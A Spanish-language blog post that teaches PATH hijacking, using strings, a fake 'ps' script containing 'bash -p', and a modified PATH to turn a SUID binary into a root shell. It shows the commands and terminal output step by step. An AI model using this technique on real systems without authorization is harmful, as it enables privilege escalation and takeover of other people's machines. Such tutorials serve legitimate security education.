---
date: 2021-09-07T20:22:05.000Z
layout: post
comments: true
title: PATH Hijacking
subtitle: 'y su explotación en un binario SIUD'
description: >-
image: >-
  http://imgfz.com/i/UWCKliL.png
optimized_image: >-
 http://imgfz.com/i/UWCKliL.png
category: ciberseguridad
tags:
  - permisos
  - linux
  - GNU
  - ciberseguridad
  - hacking
author: Felipe Canales Cayuqueo
paginate: true
---

Con el comando ```strings``` se nos permite listar las cadenas de carácteres imprimibles de un binario. ```strings demo``` nos podría mostrar el comando aplicado a nivel de sistema osea podría ser ```/usr/bin/ps```, detectado en ```demo.c```. Esto es PATH hijacking, que es el secuestro del PATH para alterar el flujo de como operan los comandos por el orden de prioridad. Ejemplo:

```
user$ touch ps
user$ chmod +x ps [Esto permitirá la ejecución]
user$ nano ps
```

Le asignamos que nos ejecute una bash, con la flag ```-p``` para que direccione directamente al propietario y me pueda convertir en root.
```
bash -p
```

Ahora alteramos nuestro propio PATH a través del comando ```export```:

```
user$ echo $PATH
/home/user/.local/bin:/snap/bin:/user/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

user$ export PATH=/tmp:$PATH
user$ echo $PATH
/tmp:/home/user/.local/bin:/snap/bin:/user/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

user$ ls
ps
user$ cd /home/user/Desktop/
user$ ls
demo  demo.c
user$ pwd
/home/user/Desktop/
user$ ./demo

[*] Listando procesos (/usr/bin/ps):

    PID TTY          TIME CMD
   29098 pts/0    00:00:01 sudo
   29099 pts/0    00:00:00 su
   29100 pts/0    00:00:00 gitstatusd-linu
   29103 pts/0    00:00:00 demo
   29137 pts/0    00:00:00 sh
   31299 pts/0    00:00:00 ps


[*] Listando procesos (ps):

admin@kali:/home/root/Desktop# whoami
root
```

Y así es como se obtiene acceso a través de PATH Hijacking.
